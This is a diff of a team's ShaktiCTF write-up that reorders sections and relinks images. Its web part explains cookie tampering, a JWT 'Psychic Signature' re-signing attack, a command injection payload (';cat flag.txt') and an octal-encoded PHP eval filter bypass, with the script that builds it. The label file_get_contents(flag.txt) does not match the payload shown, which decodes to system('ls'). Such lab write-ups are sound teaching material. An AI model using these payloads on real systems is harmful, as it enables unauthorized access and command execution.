@@ -9,13 +9,163 @@ tags: [Web, Reverse, Forensics, Crypto]
 
 ## Summary
 <ul>
+    <li><a href="#web">Web</a></li>
     <li><a href="#forensics">Forensic</a></li>
     <li><a href="#crypto">Crypto</a></li>
-    <li><a href="#web">Web</a></li>
     <li><a href="#reverse">Reverse</a></li>
 </ul>
 
 ![result](assets/ShaktiCTF/result.png)
+
+## Web 
+### Delicious 
+Flag by : **Anakin**
+
+The chall begin on a big cookie screen. 
+
+![intro](assets/ShaktiCTF/Delicious/intro.png)
+
+I do not know you but when I see a cookie I think directly to the session cookie so I look if there is one configured
+
+![cookie](assets/ShaktiCTF/Delicious/fond_cookie.png)
+
+We have a cookie and has seen eye it is encoded in b64, I will use burpsuite to better interact with the data 
+
+When I decode the cookie in burp I can see the admin value is 0
+
+![decode](assets/ShaktiCTF/Delicious/decode_cookie.png)
+
+I can juste change the value to 1 and send the request.
+
+![flag](assets/ShaktiCTF/Delicious/flag.png)
+
+GG we get the Flag ! 
+
+### Ultimate Spiderman Fan
+
+Flag by : **Anakin** & **Talace**
+
+We get this page : 
+
+![intro](assets/ShaktiCTF/Ultimate_sipderman/intro.png)
+
+We can see directly that we will have to find a way to buy the **$5,000 Spider Surprize** 
+
+We can buy an item and after that we can do a kind of check to recover a token as it is said in the message 
+
+```texte 
+
+Your Spider Token has been set
+
+Proceed to /checkout to confirm your payment.
+
+```
+
+If we click on checkout it says that the payment is confirmed but if we look at our cookie side we can see that there is a jwt session token that was setup. 
+
+![find_jwt](assets/ShaktiCTF/Ultimate_sipderman/find_jwt.png)
+
+Lets analyse it with burp and is extension **jwt editor**. 
+
+Mainly the jwt is composing the following in decoded form 
+
+```bash
+# Header
+{"alg": "HS256", "typ": "JWT"}
+# Payload
+{"amount": 1000}
+```
+
+It will therefore be necessary to find the way to resign the token by modifying the payload and its parameter amount = 5000.
+
+Still with burpsuite use the attack `Signe with Psychic Signature` This attaque will update the algorythme of the jwt and if I jwt is vulnerable we will be able to resign it with the new payload 
+
+The new jwt before the attack : 
+
+```bash
+# Header
+{"typ": "JWT","alg": "ES256"}
+# Payload
+{"amount": 5000}
+```
+
+Now send the request always in `/checkout` and get the flag 😁
+![fmag](assets/ShaktiCTF/Ultimate_sipderman/flag.png)
+
+### Find the flag - Command injection
+
+Flag by : **Talace**
+
+
+![intro](assets/ShaktiCTF/web/find_the_flag/intro.png)
+
+We got a website and his source code, pretty nice!
+
+Here we have only one route and request, the get for / , this code take a argument `?test` in the url and make a `find` command with his value, directly with in the server. That’s nice, we have a `command injection` here, with no filter in the code.
+
+![code](assets/ShaktiCTF/web/find_the_flag/code.png)
+
+
+If we use this parameter we are able to retrieve the list of current file in the folder
+
+`https://10.10.10.10/?test=`
+
+![website](assets/ShaktiCTF/web/find_the_flag/website.png)
+
+
+We try to make two request in one with `;` and it work, got the flag!
+
+`https://10.10.10.10/?test=;cat flag.txt`
+
+### Filters - Php eval with filters
+
+Flag by : **Talace** & **Anackin**
+
+![introFilter](assets/ShaktiCTF/web/filters/intro.png)
+
+
+So, we got this website, with source code. We have a parameter `?command=` for a get request. It filter the value of it and make an eval with it!
+
+![codeFilter](assets/ShaktiCTF/web/filters/code.png)
+
+
+In order to bypass the filter i made a script, to encode in octal.
+
+```python
+def string_to_octal(input_string):
+    octal_string = '"'
+    for char in input_string:
+        octal_char = oct(ord(char))[2:]
+        octal_string += "\\" + octal_char
+    octal_string += '"'
+    return octal_string
+
+input_string = input("Enter your php function: ")
+octal_function = string_to_octal(input_string)
+
+input_string = input("Entrez the parameter for this function : ")
+octal_parameter = string_to_octal(input_string)
+
+print("Payload:", octal_function + '(' + octal_parameter + ')')
+
+```
+
+We got our payload. (*`file_get_contents(flag.txt)`*)
+
+`"\163\171\163\164\145\155"("\154\163")`
+
+It raise an error:
+
+```python
+Parse error: syntax error, unexpected end of file in /var/www/html/index.php(17) : eval()'d code on line 1
+
+```
+
+I tried experimenting with simply closing the PHP tag, and it worked! Our final payload
+
+`"\163\171\163\164\145\155"("\154\163")?>`
+
+GG ! Let's retrieve our flag !!
 
 ## Forensics 
 ### Aqua Gaze
@@ -99,152 +249,6 @@ With more space to better understanding :
 I think we can easily guess the flag 😼
 
 Final flag : `shaktictf{was_it_too_easy_to_find}`
-
-## Web 
-### Delicious 
-Flag by : **Anakin**
-
-The chall begin on a big cookie screen. 
-
-![intro](assets/ShaktiCTF/Delicious/intro.png)
-
-I do not know you but when I see a cookie I think directly to the session cookie so I look if there is one configured
-
-![cookie](assets/ShaktiCTF/Delicious/fond_cookie.png)
-
-We have a cookie and has seen eye it is encoded in b64, I will use burpsuite to better interact with the data 
-
-When I decode the cookie in burp I can see the admin value is 0
-
-![decode](assets/ShaktiCTF/Delicious/decode_cookie.png)
-
-I can juste change the value to 1 and send the request.
-
-![flag](assets/ShaktiCTF/Delicious/flag.png)
-
-GG we get the Flag ! =) 
-
-### Ultimate Spiderman Fan
-
-Flag by : **Anakin** & **Talace**
-
-We get this page : 
-
-![intro](assets/ShaktiCTF/Ultimate_sipderman/intro.png)
-
-We can see directly that we will have to find a way to buy the **$5,000 Spider Surprize** 
-
-We can buy an item and after that we can do a kind of check to recover a token as it is said in the message 
-
-```texte 
-
-Your Spider Token has been set
-
-Proceed to /checkout to confirm your payment.
-
-```
-
-If we click on checkout it says that the payment is confirmed but if we look at our cookie side we can see that there is a jwt session token that was setup. 
-
-![find_jwt](assets/ShaktiCTF/Ultimate_sipderman/find_jwt.png)
-
-Lets analyse it with burp and is extension **jwt editor**. 
-
-Mainly the jwt is composing the following in decoded form 
-
-```bash
-# Header
-{"alg": "HS256", "typ": "JWT"}
-# Payload
-{"amount": 1000}
-```
-
-It will therefore be necessary to find the way to resign the token by modifying the payload and its parameter amount = 5000.
-
-Still with burpsuite use the attack `Signe with Psychic Signature` This attaque will update the algorythme of the jwt and if I jwt is vulnerable we will be able to resign it with the new payload 
-
-The new jwt before the attack : 
-
-```bash
-# Header
-{"typ": "JWT","alg": "ES256"}
-# Payload
-{"amount": 5000}
-```
-
-Now send the request always in `/checkout` and get the flag 😁
-![fmag](assets/ShaktiCTF/Ultimate_sipderman/flag.png)
-
-### Find the flag - Command injection
-
-Flag by : **Talace**
-
-
-![2024-03-09_12h57_20.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/01c2d6a7-cd67-4878-b136-e16a53685925/2024-03-09_12h57_20.png)
-
-We got a website and his source code, pretty nice!
-
-Here we have only one route and request, the get for / , this code take a argument `?test` in the url and make a `find` command with his value, directly with in the server. That’s nice, we have a `command injection` here, with no filter in the code.
-
-![2024-03-09_12h52_43.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/6150a784-f2cf-403d-bc85-d0fba00d7fd9/2024-03-09_12h52_43.png)
-
-If we use this parameter we are able to retrieve the list of current file in the folder
-
-`https://10.10.10.10/?test=`
-
-![2024-03-09_12h55_49.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/f48de8fc-80cc-437e-a948-0d1ce25a289b/2024-03-09_12h55_49.png)
-
-We try to make two request in one with `;` and it work, got the flag!
-
-`https://10.10.10.10/?test=;cat flag.txt`
-
-### Filters - Php eval with filters
-
-Flag by : **Talace** & **Anackin**
-
-![2024-03-09_13h01_17.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/b19b5c4e-5b48-42fe-85ab-f616042b1736/2024-03-09_13h01_17.png)
-
-So, we got this website, with source code. We have a parameter `?command=` for a get request. It filter the value of it and make an eval with it!
-
-![2024-03-09_13h12_31.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/8ca96a8e-055d-447d-8a2a-068c2ed20c09/fe3ec493-dc0d-4f22-b980-2f6ee22e43ac/2024-03-09_13h12_31.png)
-
-In order to bypass the filter i made a script, to encode in octal.
-
-```python
-def string_to_octal(input_string):
-    octal_string = '"'
-    for char in input_string:
-        octal_char = oct(ord(char))[2:]
-        octal_string += "\\" + octal_char
-    octal_string += '"'
-    return octal_string
-
-input_string = input("Enter your php function: ")
-octal_function = string_to_octal(input_string)
-
-input_string = input("Entrez the parameter for this function : ")
-octal_parameter = string_to_octal(input_string)
-
-print("Payload:", octal_function + '(' + octal_parameter + ')')
-
-```
-
-We got our payload. (*`file_get_contents(flag.txt)`*)
-
-`"\163\171\163\164\145\155"("\154\163")`
-
-It raise an error:
-
-```python
-Parse error: syntax error, unexpected end of file in /var/www/html/index.php(17) : eval()'d code on line 1
-
-```
-
-I tried experimenting with simply closing the PHP tag, and it worked! Our final payload
-
-`"\163\171\163\164\145\155"("\154\163")?>`
-
-GG ! Let's retrieve our flag !!
 
 ## Reverse
 ### Warmup
